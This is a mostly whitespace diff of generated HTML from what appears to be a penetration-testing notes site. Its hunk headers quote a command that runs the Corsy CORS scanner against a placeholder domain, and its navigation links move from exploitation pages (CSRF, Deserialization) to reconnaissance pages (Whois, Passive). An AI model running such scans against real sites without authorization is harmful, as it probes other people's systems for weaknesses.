+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
     
     
 
@@ -4865,9 +4722,6 @@ python3 corsy.py -u https://example.com
       
 
       
-        
-        
-      
 
       
     
@@ -4890,8 +4744,29 @@ python3 corsy.py -u https://example.com
       
 
       
+
+      
+
+      
+    
+
+    
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
         
-        
+      
+      
+
       
 
       
@@ -5714,11 +5589,11 @@ python3 corsy.py -u https://example.com
   
     <a
       class="gdoc-page__nav--prev flex align-center"
-      href="/exploitation/vulnerability/csrf/"
-      title="CSRF"
+      href="/recon/whois/"
+      title="Whois"
     >
       <i class="gdoc-icon">gdoc_arrow_left_alt</i>
-      CSRF
+      Whois
     </a>
   
 </span>
@@ -5726,10 +5601,10 @@ python3 corsy.py -u https://example.com
   
     <a
       class="gdoc-page__nav--next flex align-center"
-      href="/exploitation/vulnerability/deserialization/"
-      title="Deserialization"
+      href="/recon/subdomain/passive/"
+      title="Passive"
     >
-      Deserialization
+      Passive
       <i class="gdoc-icon">gdoc_arrow_right_alt</i>
     </a>
   
